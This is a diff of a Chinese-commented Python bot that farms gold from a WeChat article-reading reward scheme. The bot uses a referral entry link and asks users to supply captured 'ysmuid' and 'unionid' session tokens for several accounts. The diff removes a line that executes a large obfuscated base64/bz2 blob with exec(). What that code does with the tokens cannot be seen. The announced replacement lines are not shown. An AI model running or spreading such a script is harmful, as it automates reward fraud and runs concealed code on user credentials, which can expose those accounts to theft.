@@ -1,10 +1,9 @@
 #   --------------------------------注释&变量区--------------------------------
 #   入口，微信打开：http://94b34e05121451.fxi3z.shop/mesauth/3885dd2e3833f9597b53927edcae23a5?u=2
-#   检测文章推送设置：在yuanshen_apptoken，yuanshen_topicid填入你的wxpusher的apptoken和topicid
-#   不懂看https://wxpusher.zjiecode.com/docs/#/
-#   在任意接口抓取请求头中的ysmuid 填入yuanshen_xyy 多号@分割
+#   在yuanshen_apptoken，yuanshen_topicid填入你的wxpusher的apptoken和topicid
+#   在任意接口抓取请求头中的ysmuid和请求体中的unionid 填入yuanshen_xyy 多号@分割
 #   格式 ysmuid=****@ysmuid=****   ysmuid=这个不要漏
-#   接口变化会自动停止 基本不用担心封号  默认多线程三线程执行
+#   接口变化会自动停止 默认多线程三线程执行
 #   无自动提现 懒得写 就酱
 
 MAX_gold = 10000 #最大阅读金币值
@@ -44,5 +43,218 @@ max_threads = 3 #执行线程数，改成1就是单线程了
 #        不见满街漂亮妹，哪个归得程序员？
 #
 #   --------------------------------代码区--------------------------------
-import bz2, base64
-exec(bz2.decompress(base64.b64decode('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